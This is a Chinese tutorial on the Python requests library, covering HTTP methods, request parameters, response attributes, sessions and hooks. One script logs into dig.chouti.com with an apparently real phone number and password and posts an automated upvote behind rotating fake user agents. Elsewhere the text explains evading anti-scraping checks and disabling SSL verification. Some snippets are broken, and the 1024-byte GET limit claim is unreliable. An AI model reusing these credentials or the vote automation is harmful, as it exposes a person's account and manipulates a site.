session.py实现了整个Session类以及一些session功能依赖的外部方法和类,比如其中merge_setting函数实现了将每个请求的参数和session参数的合并,从而可以让一个session中所有请求共用的参数只需要在session中设置,而每个请求可以设置自己特有的参数,同时不影响其他请求,而SessionRedirectMixin类则实现了redirect相关的一些逻辑,这部分逻辑是session必须的,但是又不是session的核心功能,因此通过Mixin类来实现,Session类也暴露了以http方法命名的一系列对外接口,session最核心的功能就是保持会话,因此在prepare_request方法中实现了将session中的headers,cookies,auth等关键参数和每个request的这些参数合并,组合出完整的http请求,最终通过send方法发送出去send方法拿到http请求响应以后,又会将服务端设置的cookies等信息保存在session中,以待下一个request使用。send方法最终发送请求是根据请求schema确定一个实现了BaseAdapter接口的对象来实现的

adapter.py最终实现了session中依赖的HTTPAdapter类,这个类通过urllib3中的Retry和PoolManager提供了http长连接连接池的维护和错误重试机制以及其他一些http请求过程中的细节问题,比如代理的处理等

models.py实现了requests中的实体类,如Request, Response等, 也可以看到在Response中通过__bool__方法的重写和很多方法的 @property 使用提供了极简的对外接口

auth.py实现了http basic认证和 http digest认证的方法, 可以直接使用

structures.py实现了requests依赖的基本数据结构,比如存储headers所使用的CaseInsensitiveDict

【 requests库的七个主要方法 】
HTTP定义了与服务器交互的不同方法,最基本的方法就是"GET"和"POST"。事实上GET请求适用于大部分请求,根据HTTP规范GET只能用于获取信息,并且是安全和幂等的。所谓安全就是用户只能获取信息,不能对信息进行修改。但是POST请求就没有这么简单了,因为他会修改服务器上的资源。
另外GET请求提交的数据大小最多1024字节,但POST请求是没有限制的

requests.request()
构造一个请求,支持以下各种方法
requests.request(method,url,**kwargs)
method: "GET"、"HEAD"、"POST"、"PUT"、"PATCH"等等
url: 请求的网址
**kwargs: 控制访问的参数

requests.get()
向特定的资源发送请求,比如查询数据,获取html的主要方法

requests.head()
获取html头部信息的主要方法
r = requests.head("http://httpbin.org/get")
print(r.headers)
{'Connection': 'keep-alive', 'Server': 'meinheld/0.6.1', 'Date': 'Mon, 20 Nov 2017 08:08:46 GMT', 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true', 'X-Powered-By': 'Flask', 'X-Processed-Time': '0.000658988952637', 'Content-Length': '268', 'Via': '1.1 vegur'}

requests.post()
向html网页提交post请求的方法,向资源提交数据比如增加数据、表单提交、文件上传。数据被包含在请求体中,post请求可能会导致新的资源被创建或旧资源被修改

requests.put()
向html网页提交put请求的方法,向服务器提交修改内容,post请求包含put请求的功能
payload={"key1":"value1","key2":"value2"}
r = requests.put("http://httpbin.org/put",data=payload)
print(r.text)

requests.patch()
向html提交局部修改的请求,request.put类似,不同的是用patch时仅需要提交需要修改的字段,节省网络带宽,而用put时必须将20个字段一起提交到url,未提交字段将会被删除。

requests.delete()
向html提交删除请求
r = requests.delete('https://httpbin.org/delete')

requests.options()
返回服务器针对特定资源所支持的HTTP请求方法,也可以利用向Web服务器发送'*'的请求来测试服务器的功能性
r = requests.options('https://httpbin.org/get')

【 requests.get() 】
r=requests.get(url,params,**kwargs)
url: 需要爬取的网站地址。
**kwargs: 以下12个控制访问的关键字参数

1、params
可选,字典或字节序列或字节流格式,为URL的查询字符串(query string)传递数据,使用一个dict作为params数可以把一些键值对以?key1=value1&key2=value2的模式增加到url中,字典里值为None的键都不会被添加到URL的查询字符串里
r = requests.get('https://www.douban.com/search', params={'q': 'python', 'cat': '1001'})
print(r.url) # 实际请求的URL:'https://www.douban.com/search?q=python&cat=1001'

将一个列表作为值传入
payload = {'key1': 'value1', 'key2': ['value2', 'value3']}
r = requests.get('http://httpbin.org/get', params=payload)
print(r.url) # http://httpbin.org/get?key1=value1&key2=value2&key2=value3

2、data
字典,字节序或文件对象,重点作为向服务器提供或提交资源是提交,作为request的内容,与params不同的是data提交的数据并不放在url链接里,而是放在url链接对应位置的地方作为数据来存储,它也可以接受一个字符串对象。

3、json
json格式的数据,json合适在相关的html,http相关的web开发中常见,也是http最经常使用的数据格式,是作为内容部分可以向服务器提交
kv = {'key1': 'value1'}
r = requests.post('http://python123.io/ws', json=kv)

4、headers
字典,为请求添加HTTP头部,定制请求头,可以用来模拟任何想模拟的浏览器来对url发起访问。
所有的header值必须是string、bytestring或unicode。尽管传递unicode header也是允许的,但不建议这样做。

hd = {'user-agent': 'Chrome/10'}
r = requests.post('http://python123.io/ws', headers=hd)

headers = {'user-agent': 'my-app/0.0.1'}
r = requests.get('https://api.github.com/some/endpoint', headers=headers)

r = requests.get('https://www.douban.com/', headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit'})
print(r.text)

定制header的优先级低于某些特定的信息源：
1、如果在.netrc中设置了用户认证信息,使用headers=设置的授权就不会生效。而如果设置了auth=参数,.netrc的设置就无效了。
2、如果被重定向到别的主机,授权header就会被删除。
3、代理授权header会被URL中提供的代理身份覆盖掉。
4、在能判断内容长度的情况下,header的Content-Length会被改写。

Requests不会基于定制header的具体情况改变自己的行为。只不过在最后的请求中,所有的header信息都会被传递进去。

在爬虫操作中经常需要携带请求头信息(比如referer、host、origin、user-agent、cookie)才能正常访问
referer：表情当前请求是从哪个url过来的,在有些反爬虫请求总中,如果不是从指定页面访问该请求就不会有相关响应
host： 标识请求将要达到那台主机,并会在服务端被验证,如果不符合就不能正确处理客户端的请求
origin：说明最初请求是从哪里发起的。跟referer相似,但origin只能用于post请求,origin适用于所有请求
user-agent： 浏览器名称,服务器可以知道该请求是从哪个浏览器过来的,在爬虫中经常需要设置这个参数来伪装请求是从浏览器中过来的
cookie：http协议是无状态的,服务器无法区分多个请求是否来自同一个人,因此需要用cookie来进行标识,一般如果需要登录才能访问的网站就需要发送cookie信息

</pre><textarea>
data = {
    'key1': 'value1',
    'key2': 'value2',
    'arr': ['one', 'two']
}

header = {
    'Referer': 'https://www.xxx.com/s',
    'host': 'xx.xxx.xxx',
    'Origin': 'https://xxxx.com',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Cookie': 'xxxxxxxxx//......'
}
resp =  = requests.post('https://www.xxx.com', data=data, header=header)

</textarea><pre>
5、cookies
字典或CookieJar,指的是从http中解析cookie
requests对Cookie做了特殊处理,不必解析Cookie就可以轻松获取指定的Cookie:
print(r.cookies['cookie_name'])   # 'example_cookie_12345'

请求中传入Cookie:
cs = {'token': '12345', 'status': 'working'}
r = requests.get(url, cookies=cs)
cookies = dict(cookies_are='working')
r = requests.get(url, cookies=cookies)

Cookie的返回对象为RequestsCookieJar,它的行为和字典类似,但接口更为完整,适合跨域名跨路径使用,还可以把Cookie Jar传到Requests中
jar = requests.cookies.RequestsCookieJar()
jar.set('tasty_cookie', 'yum', domain='httpbin.org', path='/cookies')
jar.set('gross_cookie', 'blech', domain='httpbin.org', path='/elsewhere')
url = 'http://httpbin.org/cookies'
r = requests.get(url, cookies=jar)
print(r.text)   # '{"cookies": {"tasty_cookie": "yum"}}'

</pre>模拟登录choti网站并点赞<textarea>
import requests
from fake_useragent import UserAgent
agent = UserAgent()
data={
    'phone': "8615057101356",
    'password': "199SulkyBuckets",
    'oneMonth': "1"
}

### 方式一
# 1、首先登陆任何页面获取cookie
r = requests.get(url="https://dig.chouti.com/", headers={ "User-Agent":agent.random})
cookies = r.cookies.get_dict()
print(cookies)

# 2、用户登陆,携带上一次的cookie,后台对cookie中的gpsd进行授权
r = requests.post(url="https://dig.chouti.com/login",data=data,headers={"User-Agent":agent.random,},cookies=cookies,)

# 3、点赞(只需要携带已经被授权的gpsd即可)
r = requests.post(
    url="https://dig.chouti.com/link/vote?linksId=19444596",
    headers={"User-Agent":agent.random,},
    cookies=cookies,
)
print(r.text)

### 方式二
session = requests.Session()
r = session.get(url="https://dig.chouti.com", headers={"User-Agent": agent.random})
r = session.post(url="https://dig.chouti.com/login",data=data,headers={"User-Agent": agent.random})
r = session.post(url="https://dig.chouti.com/link/vote?linksId=19444596", headers={"User-Agent": agent.random})
print(r.text)

</textarea><pre>
6、auth
元组,用来支持http认证功能
r = requests.get('https://api.github.com/user', auth=('user', 'pass'))
print(r.status_code)              # 200
print(r.headers['content-type'])  # 'application/json; charset=utf8'
print(r.encoding)                 # 'utf-8'
print(r.text)                     # {"login":"berlin75","id":34706760,"node_id":"MDQ6V ...
print(r.json())                   # {'login': 'berlin75', 'id': 34706760, 'node_id': 'MDQ6V ...

Custom Authentication
Requests允许使用自己指定的身份验证机制
任何传递给请求方法的auth参数的可调用对象在请求发出之前都有机会修改请求。
自定义的身份验证机制是作为requests.auth.AuthBase的子类来实现的。Requests在requests.auth中提供了两种常见的的身份验证方案：HTTPBasicAuth和HTTPDigestAuth

</pre>假设有一个web服务,仅在X-Pizza头被设置为一个密码值的情况下才会有响应<textarea>
from requests.auth import AuthBase
class PizzaAuth(AuthBase):
    """Attaches HTTP Pizza Authentication to the given Request object."""
    def __init__(self, username):
        self.username = username              # setup any auth-related data here
    def __call__(self, r):
        r.headers['X-Pizza'] = self.username  # modify and return the request
        return r

requests.get('http://pizzabin.org/admin', auth=PizzaAuth('kenneth'))  # make a request using Pizza Auth
< Response [200]>

</textarea><pre>
7、files
字典,是用来向服务器传输文件时使用的字段。
fs = {'files': open('data.txt', 'rb')}
r = requests.post('http://python123.io/ws', files=fs)

8、timeout
用于设定超时时间,单位为秒,当发起一个get请求时可以设置一个timeout时间,如果在timeout时间内请求内容没有返回,将产生一个timeout的异常。
可以告诉requests在经过timeout参数设定的秒数时间之后停止等待响应,所有的生产代码都应该使用这一参数,否则可能会永远失去响应
timeout仅对连接过程有效,与响应体的下载无关。timeout并不是整个下载响应的时间限制,而是如果服务器在timeout秒内没有应答将会引发一个异常,更精确地说是在timeout秒内没有从基础套接字上接收到任何字节的数据时,If no timeout is specified explicitly, requests do not time out.
r = requests.get('http://github.com', timeout=0.001)
r = requests.get('https://github.com', timeout=5)
r = requests.get('https://github.com', timeout=(3.05, 27)) # set the connect and the read timeouts separately
r = requests.get('https://github.com', timeout=None)       # wait forever for a response

9、proxies
字典,请求代理用来设置访问代理服务器,在爬虫操作中如果同样的ip频繁访问请求就容易被拉黑,这时候就需要使用代理服务了
如果需要使用代理可以通过为任意请求方法提供proxies参数来配置单个请求

import requests
proxies = {
  'http': 'http://10.10.1.10:3128',
  'https': 'http://10.10.1.10:1080',
}
requests.get('http://example.org', proxies=proxies)

也可以通过环境变量 HTTP_PROXY 和 HTTPS_PROXY 来配置代理
$ export HTTP_PROXY="http://10.10.1.10:3128"
$ export HTTPS_PROXY="http://10.10.1.10:1080"
$ python
>>> import requests
>>> requests.get('http://example.org')

若代理需要使用HTTP Basic Auth,可以使用http://user:password@host/语法
proxies = {'http': 'http://user:pass@10.10.1.10:3128/'}

要为某个特定的连接方式或主机设置代理,使用scheme://hostname作为key,它会针对指定的主机和连接方式进行匹配
proxies = {'http://10.20.1.128': 'http://10.10.1.10:5323'}

SOCKS
New in version 2.10.0.
除了基本的HTTP代理,Request还支持SOCKS协议的代理。这是一个可选功能,若要使用则需要安装第三方库,安装好依赖以后使用SOCKS代理和使用HTTP代理一样简单
$ pip install requests[socks]

proxies = {
    'http': 'socks5://user:pass@host:port',
    'https': 'socks5://user:pass@host:port'
}

Using the scheme socks5 causes the DNS resolution to happen on the client, rather than on the proxy server. This is in line with curl, which uses the scheme to decide whether to do the DNS resolution on the client or proxy. If you want to resolve the domains on the proxy server, use socks5h as the scheme.

10、allow_redirects
重定向开关,表示是否允许对url进行重定向,默认True

请求历史
默认除了HEAD,Requests会自动处理所有重定向,可以使用响应对象的history方法来追踪重定向。
Response.history是一个Response对象的列表,为了完成请求而创建了这些对象,这个对象列表按照从最老到最近的请求进行排序。

# Github将所有的HTTP请求重定向到HTTPS
r = requests.get('http://github.com')
print(r.url)            # 'https://github.com/'
print(r.status_code)    # 200
print(r.history)        # [< Response [301]>]

如果使用的是GET、OPTIONS、POST、PUT、PATCH或DELETE,那么可以通过allow_redirects参数禁用重定向处理:
r = requests.get('http://github.com', allow_redirects=False)
print(r.status_code)    # 301
print(r.history)        # []

如果使用了HEAD,也可以启用重定向:
r = requests.head('http://github.com', allow_redirects=True)
print(r.url)            # 'https://github.com/'
print(r.history)        # [< Response [301]>]

11、stream
默认情况下当进行网络请求后响应体会立即被下载,可以通过stream参数覆盖这个行为,推迟下载响应体直到访问Response.content属性
r = requests.get('https://github.com/requests/requests/tarball/master', stream=True)

此时仅有响应头被下载下来了,连接保持打开状态,因此允许根据条件获取内容
if int(r.headers['content-length']) < TOO_LONG:
  content = r.content

可以进一步使用Response.iter_content和Response.iter_lines方法来控制工作流,或者以Response.raw从底层urllib3的urllib3.HTTPResponse < urllib3.response.HTTPResponse读取未解码的响应体。

流式请求
使用Response.iter_lines()可以很方便地对流式API(例如Twitter的流式API)进行迭代。简单地设置stream为True便可以使用iter_lines对相应进行迭代

</pre><textarea>
import json, requests
r = requests.get('https://httpbin.org/stream/20', stream=True)
for line in r.iter_lines():
    # filter out keep-alive new lines
    if line:
        decoded_line = line.decode('utf-8')
        print(json.loads(decoded_line))

# 当使用decode_unicode=True在Response.iter_lines()或Response.iter_content()中时,需要提供一个回退编码方式,以防服务器没有提供默认回退编码从而导致错误
r = requests.get('https://httpbin.org/stream/20', stream=True)
if r.encoding is None: r.encoding = 'utf-8'
for line in r.iter_lines(decode_unicode=True):
    if line: print(json.loads(line))

# iter_lines不保证重进入时的安全性。多次调用该方法会导致部分收到的数据丢失。如果要在多处调用它就应该使用生成的迭代器对象
lines = r.iter_lines()
first_line = next(lines) # Save the first line for later or just skip it
for line in lines:
    print(line)

</textarea><pre>
如果在请求中把stream设为True,Requests无法将连接释放回连接池,除非消耗了所有的数据或调用了Response.close。这样会带来连接效率低下的问题。如果发现在使用stream=True的同时还在部分读取请求的body或完全没有读取body,那么就应该考虑使用with语句发送请求,这样可以保证请求一定会被关闭：
with requests.get('https://httpbin.org/get', stream=True) as r:
    # Do things with the response here.

Keep-Alive持久连接
urllib3使同一会话内的持久连接是完全自动处理的,同一会话内发出的任何请求都会自动复用恰当的连接
只有所有的响应体数据被读取完毕连接才会被释放为连接池,所以确保将stream设置为False或读取Response对象的content属性

you can read the undecoded body from the underlying urllib3 urllib3.HTTPResponse at Response.raw.

12、verify
SSL Cert Verification,选项verify仅应用于主机证书
Requests可以为HTTPS请求验证SSL证书,就像web浏览器一样,默认True表示开启,如果域名上没有设置SSL或证书验证失败Requests会抛出SSLError
>>> requests.get('https://requestb.in')
requests.exceptions.SSLError: hostname 'requestb.in' doesn't match either of '*.herokuapp.com', 'herokuapp.com'

Github设置了SSL
>>> requests.get('https://github.com')
< Response [200]>

可以为verify传入CA_BUNDLE文件的路径,或包含可信任CA证书文件的文件夹路径,或者将其保持在会话中
如果verify设为文件夹路径,文件夹必须通过OpenSSL提供的c_rehash工具处理。
还可以通过REQUESTS_CA_BUNDLE环境变量定义可信任CA列表
requests.get('https://github.com', verify='/path/to/certfile')
s = requests.Session()
s.verify = '/path/to/certfile'

将verify设为false绕过SSL认证
>>> requests.get('https://kennethreitz.org', verify=False)
< Response [200]>

13、cert
Client Side Certificates客户端证书
用于设置保存本地SSL证书路径,本地证书的私有key必须是解密状态。目前Requests不支持使用加密的key
也可以指定一个本地证书用作客户端证书,可以是单个文件(包含密钥和证书)或一个包含两个文件路径的元组,或者保持在会话中

requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key'))
s = requests.Session()
s.cert = '/path/client.cert'

如果指定了一个错误路径或一个无效的证书会抛出SSLError:
>>> requests.get('https://kennethreitz.org', cert='/wrong_path/client.pem')
SSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib

CA Certificates(CA证书)
Requests默认附带了一套它信任的根证书,来自于Mozilla trust store。然而它们在每次Requests更新时才会更新。这意味着如果固定使用某一版本的Requests,证书有可能已经太旧了。
从Requests 2.4.0版之后如果系统中装了certifi包,Requests会试图使用它里边的证书,这样用户就可以在不修改代码的情况下更新他们的可信任证书
为了安全起见应该经常更新certifi

【 response对象属性 】
1、r.status_code
检测响应状态码,若为200则表示请求成功。为方便引用,Requests还附带了一个内置的状态码查询对象:
r.status_code == requests.codes.ok          # True

2、r.raise_for_status()
如果发送了一个错误请求如4XX客户端错误或5XX服务器错误响应失败请求则抛出异常,r的status_code是200时调用raise_for_status()后返回None

>>> bad_r = requests.get('http://httpbin.org/status/404')
>>> bad_r.status_code        # 404
>>> bad_r.raise_for_status() # requests.exceptions.HTTPError: 404 Client Error

3、r.headers
以字典对象存储服务器响应头,但这个字典比较特殊,字典键不区分大小写,若键不存在则返回None
print(r.headers)            # {Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked'}
print(r.headers['Content-Type'])      # 'text/html; charset=utf-8'
print(r.headers.get('content-type'))  # 可以使用任意大写形式来访问这些响应头字段

服务器可以多次接受同一header,每次都使用不同的值,但Requests会合并多个相同名称的header,这样它们就可以用一个映射"field-name: field-value"来表示,将每个后续的栏位值依次追加到合并的栏位值中,用逗号隔开即可,这样做不会改变信息的语义。

The Response object contains all of the information returned by the server and also contains the Request object you created originally
r = requests.get('https://en.wikipedia.org/wiki/Monty_Python')
r.headers  # {'content-length': '56170', 'content-encoding':'gzip', 'content-type':'text/html; charset=UTF-8' }
r.request.headers # c{'Accept-Encoding': 'identity, deflate, compress, gzip','Accept': '*/*', 'User-Agent': 'python-requests/1.2.0'}

4、r.encoding
获取当前编码,从http header中猜测的相应内容编码方式
print(r.encoding)  # 'utf-8'
r.encoding = 'ISO-8859-1'

</pre><textarea>
import requests
r = requests.get("http://www.baidu.com")
print(r.status_code)        # 200
print(r.encoding)           # 'ISO-8859-1'
print(r.apparent_encoding)  # 'utf-8'
print(r.text)               # 中文乱码
r.encoding='utf-8'          # 设置编码
print(r.text)               # 无中文乱码

</textarea><pre>
5、r.apparent_encoding
从内容中分析出的响应内容编码方式(备选编码方式)

6、r.text
http响应内容的字符串形式即返回的页面内容,会自动根据响应头部的字符编码进行解码即以encoding解析返回内容
r = requests.get('https://api.github.com/events')
print(r.text)  # u'[{"repository":{"open_issues":0,"url":"https://github.com/...

设置r.encoding改变了编码之后每当访问r.text,Request都将会使用r.encoding的新值。可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如HTTP和XML自身可以指定编码,这样的话应该使用r.content来找到编码,然后设置r.encoding为相应的编码。这样就能使用正确的编码解析r.text了
在需要的情况下Requests也可以使用定制的编码。如果创建了自己的编码并使用codecs模块进行注册,就可以轻松地使用这个解码器名称作为r.encoding的值,然后由Requests来处理编码。

7、r.content
http响应内容的二进制形式,以字节的方式访问请求响应体,会自动解码gzip和deflate传输编码的响应数据
无论响应是文本还是二进制内容都可以用content属性获得bytes对象
print(r.content)  # b'[{"repository":{"open_issues":0,"url":"https://github.com/...

以请求返回的二进制数据创建一张图片：
>>> from PIL import Image
>>> from io import BytesIO
>>> i = Image.open(BytesIO(r.content))

8、r.json()
json响应内容,requests对于特定类型的响应如JSON可以直接获取,Requests中内置的JSON解码器帮助处理JSON数据,以json形式返回,前提返回的内容确保是json格式的,不然解析出错会抛异常,例如响应内容是401 (Unauthorized),尝试访问r.json()将会抛出ValueError: No JSON object could be decoded异常
成功调用r.json()并不意味着响应的成功,有的服务器会在失败的响应中包含一个JSON对象,这种JSON会被解码返回。要检查请求是否成功使用r.raise_for_status()或检查r.status_code是否和期望相同
r = requests.get(r = requests.get('https://api.github.com/events')
print(r.json())   # [{u'repository': {u'open_issues': 0, u'url': 'https://github.com/...

9、r.raw
返回原始响应体、来自服务器的原始套接字响应,即urllib的response对象,使用r.raw.read(),同时确保在初始请求中设置了stream=True
r = requests.get('https://api.github.com/events', stream=True)
print(r.raw)           # < urllib3.response.HTTPResponse object at 0x7f12fc2c6978>
print(r.raw.read(10))  # b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'

但一般情况下应该以下面的模式将文本流保存到文件:
with open(filename, 'wb') as fd:
    for chunk in r.iter_content(chunk_size):
        fd.write(chunk)

使用Response.iter_content将会处理大量直接使用Response.raw不得不处理的,当流下载时上面是优先推荐的获取内容方式。 Note that chunk_size can be freely adjusted to a number that may better fit your use cases

10、r.url
实际请求的URL
r = requests.get('http://github.com')
print(r.url)  # 'https://github.com/'

【 post 】
要发送POST请求,只需要把get()方法变成post(),然后传入data参数作为POST请求的数据

传递一个字典给data参数
r = requests.post('https://accounts.douban.com/login', data={'form_email':'abc@example.com','form_password':'123456'})

还可以为data参数传入一个元组列表,在表单中多个元素使用同一key时这种方式尤其有效
r = requests.post('http://httpbin.org/post', data=(('key1', 'value1'), ('key1', 'value2')))

payload_tuples = [('key1', 'value1'), ('key1', 'value2')]
r1 = requests.post('https://httpbin.org/post', data=payload_tuples)
payload_dict = {'key1': ['value1', 'value2']}
r2 = requests.post('https://httpbin.org/post', data=payload_dict)

向url post一个字符串,自动编码为data
r = requests.post("http://httpbin.org/post",data='helloworld')

r = requests.post('https://api.github.com/some/endpoint', data=json.dumps({'some': 'data'}))

requests默认使用application/x-www-form-urlencoded对POST数据编码。如果要传递JSON数据,可以直接传入json参数:
r = requests.post(url, json={'key': 'value'}) # 内部自动序列化为JSON

建议用二进制模式(binary mode)打开文件,因为Requests可能会试图提供Content-Length header,在它这样做的时候这个值会被设为文件的字节数(bytes)。如果用文本模式(text mode)打开文件就可能会发生错误
类似的,上传文件需要更复杂的编码格式,但requests把它简化成files参数:
upload_files = {'file': open('report.xls', 'rb')}   # 使用'rb'即二进制模式读取,这样获取的bytes长度才是文件的长度
r = requests.post(url, files=upload_files)

显式地设置文件名、文件类型和请求头
files = {'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
r = requests.post(url, files=files)

也可以发送作为文件来接收的字符串
url = 'http://httpbin.org/post'
files = {'file': ('report.csv', 'some,data,to,send\nanother,row,to,send\n')}
r = requests.post(url, files=files)

POST Multiple Multipart-Encoded Files
可以在一个请求中发送多个文件,例如要上传多个图像文件到一个HTML表单,使用一个多文件field叫做"images",只要把文件设到一个元组的列表中,其中元组结构为 (form_field_name, file_info)
如果发送一个非常大的文件作为multipart/form-data请求,可能希望将请求做成数据流。默认requests不支持,但第三方包requests-toolbelt是支持的

</pre><textarea>
< input type="file" name="images" multiple="true" required="true"/>

url = 'https://httpbin.org/post'
multiple_files = [
        ('images', ('foo.png', open('foo.png', 'rb'), 'image/png')),
        ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))]
r = requests.post(url, files=multiple_files)
r.text
{
  ...
  'files': {'images': 'data:image/png;base64,iVBORw ....'}
  'Content-Type': 'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a',
  ...
}

</textarea><pre>
Streaming Uploads流式上传
Requests支持流式上传,这允许发送大的数据流或文件而无需先把它们读入内存。要使用流式上传仅需为请求体提供一个类文件对象即可
强烈建议用二进制模式打开文件。这是因为requests可能会为你提供header中的Content-Length,在这种情况下该值会被设为文件的字节数。如果用文本模式打开文件就可能碰到错误
with open('massive-body', 'rb') as f:
    requests.post('http://some.url/streamed', data=f)

Chunk-Encoded Requests
对outgoing and incoming requests Requests也支持分块传输编码,要发送一个块编码的请求仅需为请求体提供一个生成器或任意没有具体长度的迭代器

def gen():
    yield 'hi'
    yield 'there'
requests.post('http://some.url/chunked', data=gen())

对于分块的编码请求,最好使用Response.iter_content()对其数据进行迭代。在理想情况下request会设置stream=True,这样就可以通过调用iter_content并将分块大小参数设为None,从而进行分块的迭代。如果要设置分块的最大体积,可以把分块大小参数设为任意整数

【 错误与异常 】
所有Requests显式抛出的异常都继承自requests.exceptions.RequestException
1、网络连接错误: 遇到网络问题(如DNS查询失败、拒绝连接等)时Requests会抛出一个ConnectionError异常。
2、http错误异常: 如果HTTP请求返回了不成功的状态码,Response.raise_for_status()会抛出一个HTTPError异常。
3、请求超时异常:若请求超时则抛出一个Timeout异常。
4、重定向异常: 若请求超过了设定的最大重定向次数则会抛出一个TooManyRedirects异常。

要判断r.status_codes是否是200,利用r.raise_for_status()语句去捕捉异常,该语句在方法内部判断r.status_code是否等于200,不等于则抛出异常。

</pre>爬取网页的通用代码框架<textarea>
try:
    r=requests.get(url,timeout=30)  # 请求超时时间为30秒
    r.raise_for_status()            # 如果状态不是200则引发异常
    r.encoding=r.apparent_encoding  # 配置编码
    return r.text
except:
    return "产生异常"

</textarea><pre>
【 session objects 】
会话对象具有主要的Requests API的所有方法

会话对象能在跨请求时保持某些参数,也会在同一个Session实例发出的所有请求之间保持cookie,期间使用urllib3的connection pooling功能。所以如果向同一主机发送多个请求,底层的TCP连接将会被重用,从而带来显著的性能提升

print([e for e in dir(requests.Session()) if not e.startswith('_')])
['adapters', 'auth', 'cert', 'close', 'cookies', 'delete', 'get', 'get_adapter', 'get_redirect_target', 'head', 'headers', 'hooks', 'max_redirects', 'merge_environment_settings', 'mount', 'options', 'params', 'patch', 'post', 'prepare_request', 'proxies', 'put', 'rebuild_auth', 'rebuild_method', 'rebuild_proxies', 'request', 'resolve_redirects', 'send', 'should_strip_auth', 'stream', 'trust_env', 'verify']

跨请求保持一些cookie
s = requests.Session()
s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')
r = s.get("http://httpbin.org/cookies")
print(r.text) # '{"cookies": {"sessioncookie": "123456789"}}'

会话也可用来为请求方法提供缺省数据,这是通过为会话对象的属性提供数据来实现的
s = requests.Session()
s.auth = ('user', 'pass')
s.headers.update({'x-test': 'true'})
s.get('http://httpbin.org/headers', headers={'x-test2': 'true'})  # both 'x-test' and 'x-test2' are sent

任何传递给请求方法的字典都会与已设置会话层数据合并,方法层的参数覆盖会话的参数
不过就算使用了会话,方法级别的参数也不会被跨请求保持
如果要手动为会话添加cookie,就使用Cookie utility函数来操纵Session.cookies

s = requests.Session()
r = s.get('https://httpbin.org/cookies', cookies={'from-my': 'browser'})
print(r.text)   # '{"cookies": {"from-my": "browser"}}'
r = s.get('https://httpbin.org/cookies')  # 第二个请求不会发送cookie
print(r.text)   # '{"cookies": {}}'

会话还可以用作前后文管理器,这样就能确保with区块退出后会话能被关闭,即使发生了异常
with requests.Session() as s:
    s.get('https://httpbin.org/cookies/set/sessioncookie/123456789')

从字典参数中移除一个值
有时会想省略字典参数中一些会话层的键。要做到这一点只需简单地在方法层参数中将那个键的值设置为None,那个键就会被自动省略掉。

包含在一个会话中的所有数据都可以直接使用

【 Prepared Request 】
从API或会话调用中收到一个Response对象时,request属性其实是使用了PreparedRequest。有时在发送请求之前,需要对body或header等做一些额外处理

</pre><textarea>
from requests import Request, Session
s = Session()
req = Request('POST', url, data=data, headers=headers)
prepped = req.prepare()
prepped.body = 'No, I want exactly this as the body.'
del prepped.headers['Content-Type']
resp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)
print(resp.status_code)

</textarea><pre>
由于没有对Request对象做什么特殊事情,立即准备和修改了PreparedRequest对象,然后把它和别的参数一起发送到requests.*或Session.*

然而上述代码会失去Requests Session对象的一些优势,尤其Session级别的状态,例如cookie就不会被应用到请求上去。要获取一个带有状态的PreparedRequest,请用Session.prepare_request()取代Request.prepare()的调用

</pre><textarea>
from requests import Request, Session
s = Session()
req = Request('GET', url, data=data, headers=headers)
prepped = s.prepare_request(req)
prepped.body = 'Seriously, send exactly these bytes.'
prepped.headers['Keep-Dead'] = 'parrot'
resp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)
print(resp.status_code)

</textarea><pre>
When you are using the prepared request flow, keep in mind that it does not take into account the environment. This can cause problems if you are using environment variables to change the behaviour of requests. For example: Self-signed SSL certificates specified in REQUESTS_CA_BUNDLE will not be taken into account. As a result an SSL: CERTIFICATE_VERIFY_FAILED is thrown. You can get around this behaviour by explicitly merging the environment settings into your session:

</pre><textarea>
from requests import Request, Session
s = Session()
req = Request('GET', url)
prepped = s.prepare_request(req)
settings = s.merge_environment_settings(prepped.url, {}, None, None, None)
resp = s.send(prepped, **settings)
print(resp.status_code)

</textarea><pre>
【 Event Hooks 】
Requests有一个钩子系统,可以用来操控部分请求过程或信号事件处理,可用的钩子: response,从一个请求产生的响应

可以通过传递一个{hook_name: callback_function}字典给hooks请求参数为每个请求分配一个钩子函数,callback_function会接受一个数据块作为它的第一个参数
若执行回调函数期间发生错误,系统会给出一个警告。
若回调函数返回一个值,默认以该值替换传进来的数据。若函数未返回任何东西,也没有什么其他的影响

</pre><textarea>
def print_url(r, *args, **kwargs):
    print(r.url, r.status_code)

def record_hook(r, *args, **kwargs):
    r.hook_called = True
    return r

# print some request method arguments at runtime
requests.get('https://www.baidu.com/', hooks={'response': print_url})
# https://www.baidu.com/ 200

# add multiple hooks to a single request. Let's call two hooks at once:
r = requests.get('https://www.baidu.com/', hooks={'response': [print_url, record_hook]})
print(r.hook_called)
# https://www.baidu.com/ 200
# True

# add hooks to a Session instance. Any hooks you add will then be called on every request made to the session,A Session can have multiple hooks, which will be called in the order they are added
s = requests.Session()
s.hooks['response'].append(print_url)
s.get('https://www.baidu.com/')
# https://www.baidu.com/ 200

</textarea><pre>
【 HTTP Verbs 】
Requests提供了几乎所有HTTP动词的功能：GET、OPTIONS、HEAD、POST、PUT、PATCH、DELETE。以下内容为使用Requests中的这些动词以及Github API提供了详细示例

HTTP GET是一个幂等方法,从给定的URL返回一个资源,当试图从一个web位置获取数据之时应该使用这个动词。一个使用示例是尝试从Github上获取关于一个特定commit的信息,假设想获取Requests的commit a050faf的信息
>>> import requests
>>> r = requests.get('https://api.github.com/repos/requests/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad')
